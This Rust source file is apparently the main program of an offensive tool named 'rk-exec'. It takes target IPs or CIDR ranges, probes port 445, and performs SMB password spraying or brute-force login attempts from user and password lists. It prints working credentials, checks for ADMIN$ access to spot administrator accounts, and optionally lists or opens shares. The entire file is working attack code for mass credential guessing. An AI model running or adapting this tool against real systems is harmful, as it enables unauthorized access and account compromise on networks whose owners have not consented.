////////////////////
// rk-exec by ASX //
////////////////////

mod args;
mod scan;
use smb::{Client, ClientConfig};
use ipnet::Ipv4Net;
use tokio::fs;


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let some_args = args::extract_args(); 

    // TAKE FILE IF PROVIDED OTHERWISE USE IP
    let mut hosts: Vec<String> = Vec::new();
    let file_path = some_args.ip;
    let contents = fs::read_to_string(&file_path).await;
    match contents {
        Ok(content) => {
            for line in content.lines() {
                hosts.push(line.to_string());
            }
        },
        Err(_e) => {
            hosts.push(file_path.to_string());
        }
    }

    let mut targets: Vec<String> = Vec::new();
    for host in hosts {
        if host.contains('/') {
            if let Ok(net) = host.parse::<Ipv4Net>() {
                for ip_addr in net.hosts() {
                    targets.push(ip_addr.to_string());
                }
            }
        } else {
            targets.push(host.clone());
        }
    }

    // TAKE FILE IF PROVIDED OTHERWISE USE USER
    let mut users: Vec<String> = Vec::new();
    let file_path = some_args.username.as_deref().unwrap_or("");
    let contents = fs::read_to_string(file_path).await;
    match contents {
        Ok(content) => {
            for line in content.lines() {
                users.push(line.to_string());
            }
        },
        Err(_e) => {
            users.push(file_path.to_string());
        },
    }

    // TAKE FILE IF PROVIDED OTHERWISE USE PASSWORD
    let mut passwords: Vec<String> = Vec::new();
    let file_path = some_args.password.as_deref().unwrap_or("");
    let contents = fs::read_to_string(file_path).await;
    match contents {
        Ok(content) => {
            for line in content.lines() {
                passwords.push(line.to_string());
            }
        },
        Err(_e) => {
            passwords.push(file_path.to_string());
        },
    }

    let share_name = "IPC$";

    
    println!("[i] Scanning {} hosts", targets.len());

    let is_spraying = users.len() > 1 && passwords.len() == 1;
    let is_bruteforce = users.len() == 1 && passwords.len() > 1;
    
    if is_spraying { println!("[i] Starting spraying attack against {} users", users.len()) } 
    else if is_bruteforce { println!("[i] Starting bruteforce attack with {} passwords", passwords.len()); }
        
    for ip in &targets {
        if scan::check_open(&ip, 445).await {
            println!("[HOST] {}", ip);
            
            for username in &users {
                for password in &passwords {
                    let client = Client::new(ClientConfig::default());
                    let connection = scan::connect_share(&client, &ip, &share_name, &username, &password).await;
                    match connection {
                        Ok(_c) => {
                            let is_admin = scan::connect_share(&client, &ip, "ADMIN$", &username, &password).await.is_ok();
                            println!("[ACCESS] {}:{} (Admin: {})", username, password, is_admin);
                            if some_args.list {
                                scan::list_shares(connection, &client, &ip).await;
                            } else if let Some(ref share_target) = some_args.connect {
                                match scan::connect_share(&client, &ip, &share_target, &username, &password).await {
                                    Ok(_c) => println!("[{}]", share_target),
                                    Err(e) => println!("[-] Error: {}", e),
                                }
                            }
                            if is_bruteforce { break; }
                        }
                        Err(_e) => println!("[-] {}:{}", username, password),
                    }
                }
            }
        } else {
            continue;
        }
    }
    Ok(())
}
